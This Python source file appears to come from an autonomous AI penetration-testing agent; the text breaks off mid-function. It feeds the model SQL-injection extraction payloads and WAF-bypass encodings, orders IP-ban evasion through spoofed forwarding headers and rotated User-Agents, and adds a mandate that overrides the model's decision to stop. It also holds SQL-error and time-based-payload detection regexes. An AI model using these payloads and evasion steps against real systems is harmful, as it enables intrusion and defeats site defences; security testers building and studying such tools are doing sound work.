"""Agent Loop — Claude Code CLI style execution loop.

Model → tool_use → executor runs → results fed back → repeat.
No legacy code block parsing. No heuristic drift detection.
Structure prevents hallucination and drift by design.
"""
from __future__ import annotations

import collections
import hashlib
import json as _json
import threading
from typing import Iterator, Optional

from rich.console import Console

from ..models.base import StreamChunk
from ..models.base import ToolCall as ModelToolCall
from ..models.registry import ModelRegistry
from ..tools.function_schema import BINGO_TOOLS
from ..tools.findings_exporter import FindingsExporter, Finding
from ..config import BingoConfig
from .context import ContextManager, Message
from .executor import ToolExecutor, ToolCall, ToolResult
from .system_prompt import build_system_prompt
from .reporter import generate_report, generate_html_report, save_report, save_html_report


class AgentLoop:
    """Claude Code CLI architecture agent loop for penetration testing."""

    def __init__(self, target: str, config: BingoConfig, console: Console | None = None, event_bus=None, cancel_token=None):
        self.target = target
        self.config = config
        self.console = console or Console()
        self.lang = config.lang or "en"
        self._event_bus = event_bus  # Web UI bridge (optional)
        self._cancel = cancel_token   # 협조적 취소 (TUI Stop) — optional

        model_cfg = config.get_active_model_config()
        if not model_cfg:
            raise RuntimeError("No model configured. Run /model first.")

        self._model = ModelRegistry.build(model_cfg)
        self._provider = getattr(model_cfg, "provider", "deepseek")
        self._is_claude = self._provider == "claude"

        vpn_mode = self._detect_vpn()
        self.executor = ToolExecutor(target, vpn_mode=vpn_mode)
        self.findings = FindingsExporter(target=target)

        # Task Graph — 침투 단계 DAG
        from ..core.intelligence import TaskGraph
        self.task_graph = TaskGraph()
        self.task_graph.load_template(target)

        # Knowledge Base — 자동 로딩
        self._kb_context = self._load_kb(target)

        # Skills Engine — 키워드 매칭 스킬 검색
        self._skill_context = self._load_skills(target)

        system_prompt = build_system_prompt(target, self.lang, self._provider)
        system_prompt += self._build_context_injection()
        self.context = ContextManager(system_prompt)

        self._max_loops = self._estimate_loop_budget(target)
        self._loop_count = 0

        # Zero Hallucination Engine — model text claim validation
        from ..core.zero_hal_v5 import ZeroHalEngine
        self.zero_hal = ZeroHalEngine(session_target=target, lang=self.lang)
        # Rolling window of recent exec outputs fed into the HAL gate (up to 20 × 2 KB)
        self._recent_exec_outputs: list[str] = []
        # Pending user-turn injections: HAL corrections + depth nudges, drained before each _call_model()
        self._pending_injections: list[str] = []
        # Track dynamic skill injection sigs (one-shot, avoid duplicate)
        self._nudged_finding_ids: set[str] = set()
        # Persistent focus tracking — finding_id → last loop nudged / total nudge count
        self._finding_last_nudge: dict[str, int] = {}
        self._finding_nudge_count: dict[str, int] = {}
        # Dynamic loop budget — last loop where a new finding was promoted (any confidence)
        self._last_finding_loop: int = 0
        # Number of dynamic budget extensions applied this session (cap: 2)
        self._budget_extensions: int = 0
        # WAF bypass technique registry — persist discovered encodings across loops
        # key: short name, value: human-readable encoding description
        self._waf_bypass_techniques: dict[str, str] = {}
        # IP ban recovery — last loop where a ban recovery injection was sent
        self._last_ip_ban_injection: int = -20
        # CSRF detection — scope keys already promoted to avoid duplicates
        self._csrf_found_scope_keys: set[str] = set()
        # Dirlist revisit tracking — scope_key → last loop where revisit nudge was sent
        self._dirlist_revisit_nudge: dict[str, int] = {}
        # Dirlist pivot — injected once after ≥5 confirmed dirlist findings
        self._dirlist_pivot_injected: bool = False
        # Fix v7.0.66: Path deduplication — track visited URLs to prevent infinite re-exploration
        self._visited_paths: set[str] = set()
        # Fix v7.0.66: Consecutive 403 counter for early WAF ban detection
        self._consecutive_403_count: int = 0
        # Fix v7.0.66: No-progress loop counter — terminate if 15 loops without findings
        self._loops_since_last_finding: int = 0

    def run(self, user_message: str) -> None:
        """Execute the full agent loop for a user message."""
        self.context.append_user(user_message)
        nudge_count = 0

        while True:
            # 협조적 취소 (TUI Stop) — iteration 경계에서 폴링.
            # 세팅되면 지금까지의 findings로 리포트를 생성하고 깔끔히 종료.
            if self._cancel is not None and self._cancel.is_set():
                self.console.print("\n[#ffaa00]⚡ 사용자 요청으로 중단됨 — 현재까지 결과로 리포트 생성[/]")
                self._finalize()
                return

            self._loop_count += 1

            # Drain web UI hints into pending injections
            if self._event_bus:
                for _hint in self._event_bus.drain_hints():
                    self._pending_injections.append(f"[Web UI Hint] {_hint}")
                self._event_bus.push_event("loop_start", {"loop": self._loop_count, "target": self.target})

            # Periodic focus re-injection — every 5 loops, re-assert unresolved findings
            if self._loop_count % 5 == 0:
                self._maybe_reinject_focus()

            # Drain pending injections (HAL corrections + depth nudges) before calling model
            while self._pending_injections:
                self.context.append_user(self._pending_injections.pop(0))

            # 1. Call model
            response_text, tool_calls = self._call_model()

            # 협조적 취소 — 도구 실행 직전 폴링. 세팅됐으면 도구를 돌리지 않고
            # 루프 상단으로 돌아가 종료 처리한다.
            if self._cancel is not None and self._cancel.is_set():
                continue

            # 2. If tool calls → execute and continue
            if tool_calls:
                nudge_count = 0
                tc_payload = [
                    {
                        "id": tc.id,
                        "type": "function",
                        "function": {"name": tc.name, "arguments": _json.dumps(tc.arguments, ensure_ascii=False)},
                    }
                    for tc in tool_calls
                ]
                self.context.append_assistant(response_text or "", tool_calls=tc_payload)
                results = self.executor.run_tools([
                    ToolCall(id=tc.id, name=tc.name, arguments=tc.arguments)
                    for tc in tool_calls
                ])
                for r in results:
                    self.context.append_tool_result(r.tool_call_id, r.name, r.content)
                    # Register exec facts in ZeroHalEngine so later claims can be anchored
                    if not r.error and r.output:
                        self.zero_hal.register_exec(r.output)
                        self._recent_exec_outputs.append(r.output[:2000])
                        if len(self._recent_exec_outputs) > 20:
                            self._recent_exec_outputs.pop(0)
                    # Dynamic skill injection — detect auth protocols in tool output
                    if not r.error and r.output:
                        self._maybe_inject_dynamic_skill(r.output)
                    new_finding = self._process_evidence(r)
                    # Emit finding event to web UI
                    if new_finding is not None and self._event_bus:
                        self._event_bus.push_event("finding", {
                            "id": new_finding.id,
                            "vuln_type": new_finding.vuln_type,
                            "severity": getattr(new_finding, "severity", ""),
                            "target": new_finding.target,
                            "payload": getattr(new_finding, "payload", "") or "",
                            "evidence": (new_finding.evidence or "")[:800],
                            "confidence": new_finding.confidence,
                        })
                    # Depth nudge: when a probable/confirmed finding appears, queue a
                    # focused follow-up message so the model drills down instead of drifting
                    if new_finding is not None and new_finding.confidence in ("probable", "confirmed"):
                        self._queue_depth_nudge(new_finding)
                    # Track last loop where any new finding was promoted (for dynamic budget)
                    if new_finding is not None:
                        self._last_finding_loop = self._loop_count
                        self._loops_since_last_finding = 0
                    else:
                        self._loops_since_last_finding += 1
                    self._extract_related_domains(r)
                    self._display_tool_result(r)
                    # Fix v7.0.66: Track visited paths to prevent infinite re-exploration
                    self._track_visited_path(r)
                    # Fix v7.0.66: Update consecutive 403 counter for WAF ban detection
                    self._update_403_counter(r)
                # HAL gate: validate model text claims against accumulated exec evidence.
                # Runs after tools execute so the gate has the freshest facts.
                if response_text:
                    _combined_exec = "\n".join(self._recent_exec_outputs[-5:])
                    _hal = self.zero_hal.process(response_text, _combined_exec)
                    if _hal.blocked:
                        self.console.print(
                            f"\n[#ff6d00]⚡ ZeroHal [{_hal.block_reason}] — unanchored claim corrected[/]"
                        )
                        if self._event_bus:
                            self._event_bus.push_event("hal_event", {"reason": _hal.block_reason, "blocked": True, "loop": self._loop_count})
                        self._pending_injections.insert(0, _hal.inject_message)
                    elif _hal.warned and _hal.inject_message:
                        if self._event_bus:
                            self._event_bus.push_event("hal_event", {"reason": "warned", "blocked": False, "loop": self._loop_count})
                        self._pending_injections.append(_hal.inject_message)
                    # Model-text SQLi auto-promote: if model claims a SQLi signal
                    # in its analysis text but never called add_finding, create the
                    # finding now so focus-persistence fires on next loop.
                    _text_finding = self._auto_sqli_from_model_text(response_text)
                    if _text_finding is not None and _text_finding.confidence in ("probable", "confirmed"):
                        self._queue_depth_nudge(_text_finding)
                        if self._event_bus:
                            self._event_bus.push_event("finding", {
                                "id": _text_finding.id,
                                "vuln_type": _text_finding.vuln_type,
                                "severity": getattr(_text_finding, "severity", ""),
                                "target": _text_finding.target,
                                "confidence": _text_finding.confidence,
                            })
                # Hard cap check — with dynamic extension
                if self._max_loops and self._loop_count >= self._max_loops:
                    # Dynamic extension: if a new finding appeared in the last 15 loops,
                    # extend the budget by 20 to allow drill-down. Cap: 2 extensions (+40 max).
                    _loops_since_finding = self._loop_count - self._last_finding_loop
                    if (self._last_finding_loop > 0
                            and _loops_since_finding <= 15
                            and self._budget_extensions < 2):
                        self._budget_extensions += 1
                        self._max_loops += 20
                        self.console.print(
                            f"\n[#ffd600]⚡ Active signal {_loops_since_finding} loops ago — "
                            f"extending budget to {self._max_loops} "
                            f"(ext {self._budget_extensions}/2)[/]"
                        )
                        self._maybe_compact()
                        continue
                    self.console.print(
                        f"\n[#ffd600]⚡ Loop cap reached ({self._max_loops}) — generating report.[/]"
                    )
                    self._finalize()
                    return
                # Fix v7.0.66: Early termination if 15 loops without any findings
                if self._loops_since_last_finding >= 15 and self._loop_count >= 20:
                    self.console.print(
                        f"\n[#ffd600]⚡ No progress for {self._loops_since_last_finding} loops — generating report.[/]"
                    )
                    self._finalize()
                    return
                # Fix v7.0.66: Check for excessive 403 rate (WAF ban)
                if self._consecutive_403_count >= 5:
                    self.console.print(
                        f"\n[#ff6d00]⚡ Excessive 403 responses ({self._consecutive_403_count}) — "
                        f"WAF ban suspected. Pausing 10s and switching User-Agent.[/]"
                    )
                    import time
                    time.sleep(10)
                    self._consecutive_403_count = 0
                self._maybe_compact()
                continue

            # 3. Text only — model chose not to call any tool.
            # Before finalizing, check for unresolved high-priority findings.
            # If probable/confirmed findings remain unresolved, force model to continue.
            self.context.append_assistant(response_text)
            if response_text:
                _combined_exec = "\n".join(self._recent_exec_outputs[-5:])
                _hal = self.zero_hal.process(response_text, _combined_exec)
                if _hal.blocked:
                    self.console.print(
                        f"\n[#ff6d00]⚡ ZeroHal [{_hal.block_reason}] — correcting text-only claim[/]"
                    )
                    if self._event_bus:
                        self._event_bus.push_event("hal_event", {"reason": _hal.block_reason, "blocked": True, "loop": self._loop_count})
                    self.context.append_user(_hal.inject_message)
                    continue  # HAL correction: retry once, still model-driven
                elif _hal.warned and _hal.inject_message:
                    if self._event_bus:
                        self._event_bus.push_event("hal_event", {"reason": "warned", "blocked": False, "loop": self._loop_count})
                    self._pending_injections.append(_hal.inject_message)
            # Guard: don't finalize if probable/confirmed findings are still unresolved
            _unresolved = self._get_high_priority_unresolved()
            if _unresolved and self._loop_count < self._max_loops:
                self._inject_no_stop_mandate(_unresolved)
                continue
            # Model produced text without any tool call → self-decided to stop.
            self._finalize()
            return

    def _call_model(self) -> tuple[str, list[ModelToolCall]]:
        """Call model and stream response. Returns (text, tool_calls)."""
        messages = self.context.build_messages()
        tools = self._get_tools_for_provider()

        text_parts: list[str] = []
        tool_calls: list[ModelToolCall] = []

        self.console.print(f"\n[#00ff41]╔═[BINGO]══ {self._loop_count} ══▶[/]\n")
        stream = self._model.chat_stream(messages, tools=tools)
        for chunk in stream:
            # 협조적 취소 — 스트리밍 청크 경계에서 폴링. 세팅되면 지금까지
            # 받은 텍스트/도구호출을 반환하고, run() 상단에서 종료 처리.
            if self._cancel is not None and self._cancel.is_set():
                break
            if chunk.text:
                text_parts.append(chunk.text)
                self.console.print(chunk.text, end="", highlight=False, markup=False)
                if self._event_bus:
                    self._event_bus.push_event("stream_chunk", {"text": chunk.text, "loop": self._loop_count})
            if chunk.tool_calls:
                tool_calls = chunk.tool_calls
            if chunk.failure:
                self.console.print(f"\n[#ff1744]✗ Provider error: {chunk.failure.message}[/]")
                break

        full_text = "".join(text_parts)
        if full_text:
            self.console.print()
        return full_text, tool_calls

    def _get_tools_for_provider(self) -> list[dict] | None:
        # Always return raw BINGO_TOOLS — each model class (_build_payload /
        # _build_claude_payload) handles the format conversion internally.
        # Pre-converting here caused a double-convert on Claude: loop.py →
        # to_anthropic_format → base.py → to_anthropic_format again → KeyError.
        return BINGO_TOOLS

    @staticmethod
    def _make_tool_sig(tc) -> str:
        """Tool call signature for duplicate detection."""
        args_str = _json.dumps(tc.arguments, sort_keys=True, ensure_ascii=False, default=str)[:200]
        return hashlib.md5(f"{tc.name}:{args_str}".encode()).hexdigest()[:8]

    def _process_evidence(self, result: ToolResult) -> Optional["Finding"]:
        """Feed tool output through the evidence ladder. Returns new Finding if promoted."""
        if result.error:
            return None
        import json as _json
        code_snippet = (
            _json.dumps(result.arguments, ensure_ascii=False, default=str)[:500]
            if result.arguments
            else result.name
        )
        finding = self.findings.process(
            result.output,
            code_snippet=code_snippet,
            execution_context={"tool_name": result.name, "executed": True},
        )
        if finding is not None:
            return finding
        # Secondary pass: executor-level SQL error auto-detect.
        # Evidence ladder misses raw SQL errors that appear in HTTP response bodies
        # when the model probes manually (no TRUE/FALSE size-diff format).
        sql_finding = self._auto_sqli_from_output(result)
        if sql_finding is not None:
            return sql_finding
        # Tertiary pass: WAF bypass signal — time-based SQLi payload that received
        # a non-403 response, indicating the payload reached the application layer.
        waf_finding = self._auto_waf_bypass_signal(result)
        if waf_finding is not None:
            return waf_finding
        # Quaternary pass: directory listing detection → CONF_CONFIRMED info_disclosure.
        dirlist_finding = self._auto_dirlist_from_output(result)
        if dirlist_finding is not None:
            return dirlist_finding
        # Quinary pass: response size differential SQLi signal → CONF_PROBABLE.
        sizediff_finding = self._auto_size_diff_sqli_detect(result)
        if sizediff_finding is not None:
            return sizediff_finding
        # Side-effect pass: IP ban recovery injection (no finding returned).
        self._auto_ip_ban_recovery(result)
        # Senary pass: CSRF auto-detect — POST success without CSRF token signature.
        csrf_finding = self._auto_csrf_detect(result)
        if csrf_finding is not None:
            return csrf_finding
        return None

    # ── SQL error regex (定义为类常量, 避免每次编译) ──────────────────────────
    _SQL_ERROR_RE = None  # lazy init

    @classmethod
    def _get_sql_error_re(cls):
        import re as _re
        if cls._SQL_ERROR_RE is None:
            cls._SQL_ERROR_RE = _re.compile(
                r"Microsoft OLE DB Provider for SQL"
                r"|Unclosed quotation mark after the character string"
                r"|Incorrect syntax near ['\"]"
                r"|You have an error in your SQL syntax"
                r"|ORA-\d{4,5}:"
                r"|PG::SyntaxError"
                r"|pg_query\(\).*?failed"
                r"|Warning:\s+mysql_"
                r"|supplied argument is not a valid MySQL"
                r"|SQLSTATE\["
                r"|DB function failed with error number"
                r"|Syntax error or access violation"
                r"|Division by zero in.*?SQL"
                r"|quoted string not properly terminated"
                r"|unterminated quoted string at or near",
                _re.I,
            )
        return cls._SQL_ERROR_RE

    def _auto_sqli_from_output(self, result: ToolResult) -> Optional["Finding"]:
        """Executor-level SQLi signal detector.

        Catches raw SQL error messages that the evidence ladder misses because
        the model formatted the probe output without TRUE/FALSE size markers.
        Returns a probable Finding if a definitive SQL error is detected.
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        output = result.output
        if not self._get_sql_error_re().search(output):
            return None
        # Extract URL/endpoint from code_snippet or output for scope_key
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', output)
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli:{target_url[:120]}"
        # Dedup: don't create duplicate findings for same endpoint
        for existing in self.findings._findings:
            if existing.vuln_type == FINDING_SQLI and existing.scope_key == scope_key:
                return None
        finding_id = "auto_sqli_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload=result.name,
            evidence=output[:2000],
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="sql_error_in_response",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _auto_waf_bypass_signal(self, result: ToolResult) -> Optional["Finding"]:
        """Detect WAF bypass: time-based SQLi payload that received a non-403 response.

        When BoraWare/Akamai/CF blocks boolean SQLi (403) but passes time-based keywords
        (SLEEP/WAITFOR), the tool output shows a small 200 response (e.g. wrong-credentials
        alert) instead of a 403 WAF block. This is a high-value signal that a time-based
        SQLi channel is open.

        Pattern:
          - Output contains SLEEP/WAITFOR/BENCHMARK SQLi keyword
          - Response size is NOT ~199 (WAF block size) AND > 60 bytes
          - OR HTTP 200 without 403
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        output = result.output

        # Must contain time-based SQLi keywords in the executed payload
        _TIME_SQLI_RE = _re.compile(
            r"SLEEP\s*\(\s*\d+\s*\)"
            r"|WAITFOR\s+DELAY"
            r"|BENCHMARK\s*\(\s*\d+"
            r"|pg_sleep\s*\(\s*\d+"
            r"|AND\s+SLEEP\s*\("
            r"|IF\s*\(.*WAITFOR"
            r"|CASE\s+WHEN.*WAITFOR"
            r"|;\s*IF\s*\(.*DELAY",
            _re.I,
        )
        if not _TIME_SQLI_RE.search(output):
            return None

        # WAF block signature: size ~199, HTTP 403
        # Bypass signature: size != 199 AND > 60, OR 200 without 403
        _bypass_detected = False

        sizes = [int(m) for m in _re.findall(r'(?i)(?:size|SIZE)[:\s=]+(\d+)', output)]
        for sz in sizes:
            # WAF block is typically 199 bytes; application responses are different sizes
            if 60 < sz < 180 or sz > 200:
                _bypass_detected = True
                break

        if not _bypass_detected:
            has_200 = bool(_re.search(r'HTTP[/\s]+1\.[01]\s+200|status[:\s]+200', output, _re.I))
            has_403 = bool(_re.search(r'HTTP[/\s]+1\.[01]\s+403|status[:\s]+403', output, _re.I))
            if has_200 and not has_403:
                _bypass_detected = True

        if not _bypass_detected:
            return None

        # ── Fix 8: Elapsed-time guard — skip when SLEEP bypassed WAF but query runs instantly ──
        # If output contains SLEEP(N), verify that actual response time >= 50% of N (min 2.5s).
        # "Bypassed WAF" ≠ "time-based channel confirmed" without a real delay.
        _sleep_arg_m = _re.search(r'SLEEP\s*\(\s*(\d+)\s*\)', output, _re.I)
        _waitfor_m   = _re.search(r'WAITFOR\s+DELAY\s+["\']0:0:(\d+)["\']', output, _re.I)
        _expected_delay = 0.0
        if _sleep_arg_m:
            _expected_delay = float(_sleep_arg_m.group(1))
        elif _waitfor_m:
            _expected_delay = float(_waitfor_m.group(1))

        if _expected_delay >= 1.0:
            # Collect all elapsed-time floats from output (e.g. "0.32s", "elapsed: 3.21", "3.45s")
            _elapsed_vals: list[float] = [float(m) for m in _re.findall(r'\b(\d+\.\d+)s\b', output)]
            _elapsed_vals += [float(m) for m in _re.findall(r'elapsed[:\s]+(\d+\.\d+)', output, _re.I)]
            if _elapsed_vals:
                _max_elapsed = max(_elapsed_vals)
                # Require at least 50% of expected delay (floor 2.5s) to count as real
                _threshold = max(2.5, _expected_delay * 0.5)
                if _max_elapsed < _threshold:
                    return None  # payload bypassed WAF but query ran instantly → false positive
            else:
                # SLEEP present in payload but output has no timing info → can't confirm, skip
                return None
        # ─────────────────────────────────────────────────────────────────────────────────────

        # ── Persist the WAF bypass technique for session-wide reuse ──────────
        # Check which encoding got through and store it so the depth nudge
        # can remind the model to reuse it on every subsequent payload.
        _UNION_NL_RE = _re.compile(r'UNION[%\s]*0[Aa]SELECT|UNION\s*%0[aA]\s*SELECT', _re.I)
        _CHUNKED_RE  = _re.compile(r'Transfer-Encoding:\s*chunked', _re.I)
        if _UNION_NL_RE.search(output) and "union_newline" not in self._waf_bypass_techniques:
            self._waf_bypass_techniques["union_newline"] = "UNION%0ASELECT (newline between UNION and SELECT)"
            self._pending_injections.insert(0,
                "[💡 UNION SELECT WAF BYPASS CONFIRMED]\n"
                "UNION%0ASELECT (newline encoding) bypasses this WAF.\n"
                "ALWAYS use this for column count and data extraction:\n"
                "  ' UNION%0ASELECT NULL%23\n"
                "  ' UNION%0ASELECT NULL,NULL%23\n"
                "  ' UNION%0ASELECT database()%23\n"
                "Do NOT revert to UNION%20SELECT or plain UNION SELECT — WAF blocks those."
            )
        elif "time_based" not in self._waf_bypass_techniques:
            self._waf_bypass_techniques["time_based"] = "time-based SQLi channel (WAF passes SLEEP/WAITFOR)"

        # Extract endpoint URL
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', output)
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli_waf_bypass:{target_url[:120]}"

        # Dedup — one bypass finding per endpoint
        for existing in self.findings._findings:
            if existing.scope_key == scope_key:
                return None

        # Extract matched payload snippet for evidence
        _m = _TIME_SQLI_RE.search(output)
        payload_snip = output[max(0, _m.start() - 30): _m.end() + 80].strip() if _m else ""

        finding_id = "waf_bypass_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload=payload_snip[:200],
            evidence=(
                f"[WAF bypass signal] Time-based SQLi payload bypassed WAF "
                f"(non-403 response detected):\n{output[:1500]}"
            ),
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="time_based_waf_bypass",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _auto_dirlist_from_output(self, result: ToolResult) -> Optional["Finding"]:
        """Detect Apache/Nginx directory listing and auto-promote to CONF_CONFIRMED.

        Directory listing is immediately verifiable from the HTML response —
        no oracle or inference needed. Promotes directly to confirmed.
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_CONFIRMED, FINDING_INFO_DISC,
        )
        SEVERITY_MEDIUM = "medium"
        output = result.output
        # Apache/Nginx directory listing signature
        if not (_re.search(r'<title>\s*Index of\s+/', output, _re.I) or
                _re.search(r'<h1>\s*Index of\s+/', output, _re.I)):
            return None
        # Extract the exposed path
        path_m = _re.search(r'Index of\s+(/[^\s<"]*)', output, _re.I)
        dir_path = path_m.group(1).rstrip() if path_m else "/"
        target_url = self.target.rstrip("/") + dir_path
        scope_key = f"dirlist:{target_url[:120]}"
        # Dedup — one finding per path; inject revisit nudge when re-detected (Fix 6)
        for existing in self.findings._findings:
            if existing.scope_key == scope_key:
                last_nudge = self._dirlist_revisit_nudge.get(scope_key, -20)
                if (self._loop_count - last_nudge) >= 10:
                    self._dirlist_revisit_nudge[scope_key] = self._loop_count
                    self._pending_injections.append(
                        f"[ℹ️ Dirlist revisit] {target_url} 이미 confirmed dirlist로 기록됨 "
                        f"(loop {self._loop_count}). 같은 경로 반복 불필요 — "
                        f"SQLi/LFI/admin 패널/파일 업로드 등 다른 공격 벡터로 전환하세요."
                    )
                return None
        # Count sensitive file types exposed
        file_hits = _re.findall(
            r'href="[^"]*\.(php|asp|aspx|jsp|html|js|txt|cfg|conf|bak|sql|zip|tar|gz|env|key|pem)"',
            output, _re.I,
        )
        file_count = len(file_hits)
        finding_id = "dirlist_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_INFO_DISC,
            severity=SEVERITY_MEDIUM,
            target=target_url,
            payload="Directory listing enabled",
            evidence=(
                f"[Directory listing CONFIRMED] {target_url}\n"
                f"Sensitive files exposed: {file_count} ({', '.join(set(f.lower() for f in file_hits[:10]))})\n"
                f"{output[:1200]}"
            ),
            timestamp=_time.time(),
            confirmed=True,
            confidence=CONF_CONFIRMED,
            reason_code="directory_listing",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        # Fix 7: ≥5 dirlist findings 확인되면 pivot nudge 한 번 주입
        if not self._dirlist_pivot_injected:
            dirlist_count = sum(
                1 for f in self.findings._findings
                if getattr(f, "reason_code", "") == "directory_listing"
            )
            if dirlist_count >= 5:
                self._dirlist_pivot_injected = True
                self._pending_injections.append(
                    f"[📋 Dirlist pivot 권고] {dirlist_count}개 디렉토리 리스팅 confirmed — "
                    f"충분한 정보 수집 완료. 이제 SQLi/LFI/파일 업로드/admin 패널 공격으로 "
                    f"전환하세요. 새로운 dirlist 탐색을 중단하고 고위험 취약점 공략에 집중하세요."
                )
        return finding

    def _auto_size_diff_sqli_detect(self, result: ToolResult) -> Optional["Finding"]:
        """Detect SQLi signal from response size differential in bash output.

        Matches the pattern where the model probes a parameter with a quote
        and reports the size change (e.g. 41515B → 28129B). A diff > 20%
        with baseline > 1000B is promoted to CONF_PROBABLE.
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, FINDING_SQLI, SEVERITY_HIGH,
        )
        output = result.output
        # Must contain quote/injection context keywords
        if not _re.search(r"(?:quote|'|inject|ERR\d|SQLI|ptype|param|baseline)", output, _re.I):
            return None
        # Extract all meaningful size values (skip WAF-block sizes ~199)
        # Matches: "Size: 41515", "S:28129", "SIZE: 30028", "size=41515"
        all_sizes = [
            int(m) for m in _re.findall(
                r'(?:Size|SIZE|S)[:\s=]+(\d+)', output
            )
            if int(m) > 500  # ignore tiny (WAF/error) responses
        ]
        if len(all_sizes) < 2:
            return None
        max_size = max(all_sizes)
        min_size = min(all_sizes)
        if max_size < 1000:
            return None
        diff_ratio = (max_size - min_size) / max_size
        if diff_ratio < 0.20:  # require at least 20% difference
            return None
        diff_bytes = max_size - min_size
        # Extract URL from output or use target
        _url_m = _re.search(r'https?://[^\s"\'<>]{5,200}', output)
        target_url = _url_m.group(0) if _url_m else self.target
        scope_key = f"sqli_sizediff:{target_url[:120]}"
        # Dedup — one size-diff finding per endpoint
        for existing in self.findings._findings:
            if existing.vuln_type == FINDING_SQLI and existing.scope_key == scope_key:
                return None
        finding_id = "sizediff_" + _hashlib.md5(scope_key.encode()).hexdigest()[:8]
        finding = Finding(
            id=finding_id,
            vuln_type=FINDING_SQLI,
            severity=SEVERITY_HIGH,
            target=target_url,
            payload=f"size_diff={diff_bytes}B ({diff_ratio * 100:.0f}%)",
            evidence=(
                f"[SQLi size differential] baseline={max_size}B → injected={min_size}B "
                f"(diff={diff_bytes}B, {diff_ratio * 100:.0f}%)\n"
                f"{output[:1500]}"
            ),
            timestamp=_time.time(),
            confirmed=False,
            confidence=CONF_PROBABLE,
            reason_code="response_size_differential",
            scope_key=scope_key,
        )
        self.findings._findings.append(finding)
        return finding

    def _auto_ip_ban_recovery(self, result: ToolResult) -> None:
        """Detect IP ban from consecutive 403s in bash output and inject recovery hints.

        Throttled to once every 10 loops to avoid injection spam.
        Side-effect only — does not return a Finding.
        """
        if not result.output:
            return
        import re as _re
        import random as _random
        output = result.output
        # Count 403 WAF-block signatures in output
        ban_hits = len(_re.findall(
            r'(?:HTTP:403|HTTP/1\.[01]\s+403|status[:\s]+403|C:403)',
            output, _re.I,
        ))
        if ban_hits < 2:
            return
        # Throttle: don't inject more than once per 10 loops
        if (self._loop_count - self._last_ip_ban_injection) < 10:
            return
        self._last_ip_ban_injection = self._loop_count
        _UAS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) "
            "Gecko/20100101 Firefox/127.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        ]
        ua = _random.choice(_UAS)
        xff = (f"{_random.randint(1,254)}.{_random.randint(1,254)}."
               f"{_random.randint(1,254)}.{_random.randint(1,254)}")
        if self.lang == "zh":
            msg = (
                f"[🚫 IP封禁检测 — 自动恢复提示 (loop {self._loop_count})]\n"
                f"连续403响应 ({ban_hits}次) — IP可能被临时封禁。立即:\n"
                f"1. 切换 User-Agent 为: {ua}\n"
                f"2. 添加请求头: X-Forwarded-For: {xff}\n"
                f"3. 同时添加: X-Real-IP: {xff}, True-Client-IP: {xff}\n"
                f"4. 等待5秒后重试主页确认解封\n"
                f"5. 如仍封禁，加Referer头: {self.target}"
            )
        elif self.lang == "ko":
            msg = (
                f"[🚫 IP차단 감지 — 자동 복구 힌트 (loop {self._loop_count})]\n"
                f"연속 403 ({ban_hits}회) — IP 임시 차단 가능성. 즉시:\n"
                f"1. User-Agent 변경: {ua}\n"
                f"2. 헤더 추가: X-Forwarded-For: {xff}\n"
                f"3. 추가: X-Real-IP: {xff}, True-Client-IP: {xff}\n"
                f"4. 5초 대기 후 메인 페이지로 차단 해제 확인\n"
                f"5. 여전히 차단되면 Referer: {self.target} 추가"
            )
        else:
            msg = (
                f"[🚫 IP ban detected — recovery hints (loop {self._loop_count})]\n"
                f"Consecutive 403 ({ban_hits}x) — IP may be temporarily banned. Now:\n"
                f"1. Switch User-Agent to: {ua}\n"
                f"2. Add header: X-Forwarded-For: {xff}\n"
                f"3. Also add: X-Real-IP: {xff}, True-Client-IP: {xff}\n"
                f"4. Wait 5s and retry homepage to confirm unban\n"
                f"5. If still banned, add Referer: {self.target}"
            )
        self._pending_injections.append(msg)

    def _auto_csrf_detect(self, result: ToolResult) -> Optional["Finding"]:
        """Detect CSRF vulnerability from POST success response without CSRF token.

        Triggers when:
          1. Tool output contains a POST success phrase (접수완료/success/완료 등)
          2. The tool arguments do NOT contain a CSRF token signature
             (ptSignature, csSignature, csrf_token, _token, nonce)
        Promotes to CONF_PROBABLE csrf finding.
        """
        if not result.output:
            return None
        import re as _re
        import hashlib as _hashlib
        import time as _time
        from ..tools.findings_exporter import (
            Finding, CONF_PROBABLE, SEVERITY_MEDIUM,
        )
        FINDING_CSRF = "csrf"
        output = result.output
        # 1. Must contain a POST success phrase
